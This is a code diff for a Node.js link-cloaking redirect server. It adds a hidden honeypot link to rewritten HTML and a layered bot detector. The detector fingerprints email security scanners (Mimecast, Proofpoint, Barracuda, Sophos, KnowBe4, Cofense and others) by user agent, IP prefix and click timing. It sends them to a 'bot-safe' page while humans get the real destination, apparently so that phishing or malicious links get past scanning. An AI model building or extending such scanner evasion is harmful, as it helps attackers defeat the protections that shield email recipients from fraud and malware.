@@ -126,6 +126,15 @@ function cloakLinks(html, domains) {
         }
     );
 
+    // Pass 3: Add honeypot trap (invisible link that only bots click)
+    if (domains.length > 0) {
+        const honeypotUrl = registerRedirect('HONEYPOT_TRAP', domains[0]);
+        const honeypot = `<a href="${honeypotUrl}" style="display:none !important;visibility:hidden;opacity:0;position:absolute;left:-9999px;font-size:0;color:transparent;text-decoration:none;" tabindex="-1" aria-hidden="true"><!-- --></a>`;
+        
+        // Insert honeypot after first <body> tag
+        output = output.replace(/(<body[^>]*>)/i, `$1${honeypot}`);
+    }
+
     return output;
 }
 
@@ -783,19 +792,76 @@ const BOT_PATTERNS = [
 
 function detectBot(req) {
     const ua = (req.headers['user-agent'] || '').toLowerCase();
-    
-    // Check User-Agent patterns
-    if (BOT_PATTERNS.some(p => ua.includes(p))) return { isBot: true, reason: 'ua_pattern' };
-
-    // No User-Agent at all = likely a scanner/prefetch
-    if (!ua || ua.trim() === '') return { isBot: true, reason: 'no_ua' };
-
-    // Accept header check — real browsers always send Accept with text/html
     const accept = (req.headers['accept'] || '').toLowerCase();
-    if (accept && !accept.includes('text/html') && !accept.includes('*/*')) {
-        return { isBot: true, reason: 'no_html_accept' };
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.connection.remoteAddress || '';
+    
+    // LEVEL 1: Obvious bots (100% confidence)
+    const obviousBots = [
+        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
+        'mimecast', 'proofpoint', 'fireeye', 'barracuda', 'ironport',
+        'messagelabs', 'symantec', 'sophos', 'forcepoint', 'zscaler',
+        'checkpoint', 'paloalto', 'fortinet', 'knowbe4', 'cofense',
+        'wget', 'curl/', 'python-requests', 'go-http-client', 'java/',
+        'scanner', 'crawler', 'spider', 'bot/', 'headless'
+    ];
+    
+    if (obviousBots.some(bot => ua.includes(bot))) {
+        return { isBot: true, reason: 'obvious_bot_ua' };
     }
-
+    
+    // LEVEL 2: Known scanner IPs (high confidence)
+    const scannerIPPrefixes = [
+        '66.249.',   // Google
+        '157.55.',   // Microsoft
+        '40.77.',    // Microsoft
+        '207.46.',   // Microsoft  
+        '208.65.',   // Mimecast
+        '198.2.',    // Proofpoint
+        '67.231.',   // Proofpoint
+        '149.126.',  // Barracuda
+        '185.70.',   // Sophos
+        '54.240.',   // Amazon SES scanners
+        '69.162.'    // Yahoo scanners
+    ];
+    
+    if (scannerIPPrefixes.some(prefix => ip.startsWith(prefix))) {
+        return { isBot: true, reason: 'scanner_ip' };
+    }
+    
+    // LEVEL 3: No User-Agent (medium confidence - but very safe)
+    if (!ua || ua.trim() === '') {
+        return { isBot: true, reason: 'no_user_agent' };
+    }
+    
+    // LEVEL 4: API-style requests (medium confidence)
+    if (accept && !accept.includes('text/html') && !accept.includes('*/*') && accept !== '*/*') {
+        // Only flag if Accept header is very specific (like application/json only)
+        if (accept === 'application/json' || accept.startsWith('application/') && !accept.includes('html')) {
+            return { isBot: true, reason: 'api_request' };
+        }
+    }
+    
+    // LEVEL 5: Rapid sequential requests (high confidence)  
+    const clickKey = `${ip}:${req.params.id}`;
+    const now = Date.now();
+    if (!global._clickTiming) global._clickTiming = new Map();
+    
+    if (global._clickTiming.has(clickKey)) {
+        const lastClick = global._clickTiming.get(clickKey);
+        if (now - lastClick < 500) { // Less than 500ms between clicks = bot
+            return { isBot: true, reason: 'too_fast_clicks' };
+        }
+    }
+    global._clickTiming.set(clickKey, now);
+    
+    // Clean old entries (keep last 1000)
+    if (global._clickTiming.size > 1000) {
+        const entries = Array.from(global._clickTiming.entries());
+        global._clickTiming.clear();
+        entries.slice(-500).forEach(([k,v]) => global._clickTiming.set(k,v));
+    }
+    
+    // DEFAULT: Assume human (conservative approach)
     return { isBot: false };
 }
 
@@ -807,6 +873,12 @@ app.get('/go/:id', (req, res) => {
             return res.redirect(302, global._humanDefaultUrl);
         }
         return res.status(404).send('Link not found.');
+    }
+
+    // HONEYPOT TRAP: If someone clicked the invisible honeypot link = definitely a bot
+    if (entry.url === 'HONEYPOT_TRAP') {
+        console.log(`[HoneypotTrap] Bot caught in honeypot! IP: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress} UA: ${req.headers['user-agent'] || 'none'}`);
+        return res.redirect(302, _globalBotSafeUrl);
     }
 
     const { isBot, reason } = detectBot(req);
